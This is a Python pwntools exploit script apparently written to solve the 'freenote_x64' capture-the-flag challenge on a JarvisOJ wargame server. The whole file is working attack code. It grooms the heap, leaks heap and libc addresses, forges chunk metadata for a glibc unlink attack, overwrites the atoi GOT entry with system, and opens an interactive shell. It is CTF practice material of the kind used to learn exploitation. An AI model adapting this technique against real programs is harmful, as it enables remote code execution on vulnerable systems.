from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
context.arch = "amd64"

local = 0 

if local:
    cn = process('./freenote_x64')
    bin = ELF('./freenote_x64')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    cn = remote('pwn2.jarvisoj.com', 9886)
    bin = ELF('./freenote_x64')
    libc = ELF('./libc-2.19.so')

def list_post():
    pass

def add_post(length,content):
    cn.sendline('2')
    cn.recvuntil('Length')
    cn.sendline(str(length))
    cn.recvuntil('Enter')
    cn.sendline(content)

def edit_post(idx,length,content):
    cn.sendline('3')
    cn.recvuntil('number')
    cn.sendline(str(idx))
    cn.recvuntil('Length')
    cn.sendline(str(length))
    cn.recvuntil('Enter')
    cn.sendline(content)

def del_post(idx):
    cn.sendline('4')
    cn.recvuntil('number')
    cn.sendline(str(idx))

chunk_list=0x00000000006020A8
test=0x00000000004012E6

#-------init-------
for i in range(5):
    add_post(0x80,str(i)*0x80)

del_post(3)
del_post(1)

pay = '0'*0x80 + 'a'*0x10
edit_post(0,0x90,pay)
#------------------


#--------leak----------
cn.sendline('1')
cn.recvuntil('a'*0x10)
leak_data = cn.recvuntil('\x0a')[:-1]
cn.recv()
leak_addr = u64(leak_data + '\x00'*(8-len(leak_data)))
heap_base = leak_addr - 0x19d0#offset
chunk0_addr = heap_base+0x30
success("leak_addr: "+hex(leak_addr))
success("heap_base: "+hex(heap_base))
success("chunk0_addr: "+hex(chunk0_addr))
#----------------------


#-------unlink--------
pay = p64(0x90) + p64(0x80) + p64(chunk0_addr-0x18) + p64(chunk0_addr-0x10) + '0'*(0x80-8*4)
pay += p64(0x80) + p64(0x90+0x90) + '1'*0x70
success(hex(len(pay)))
edit_post(0,len(pay),pay)
del_post(1)
#----------------------

#--------leak----------
pay = p64(2) + p64(1) + p64(0x100) + p64(chunk0_addr-0x18)
pay += p64(1)+p64(0x8)+p64(bin.got['atoi'])
pay += '\x00'*(0x100-len(pay))
edit_post(0,len(pay),pay)
cn.sendline('1')
cn.recvuntil('0. ')
cn.recvuntil('1. ')
atoi = cn.recvuntil('\x0a')[:-1]
cn.recv()
atoi = u64(atoi + '\x00'*(8-len(atoi)))
system = atoi - libc.symbols['atoi']+libc.symbols['system']
success("atoi: "+hex(atoi))
success("system: "+hex(system))
#----------------------

#--------hijack&getshell--------
edit_post(1,8,p64(system))
cn.sendline("$0")
#----------------------

cn.interactive()
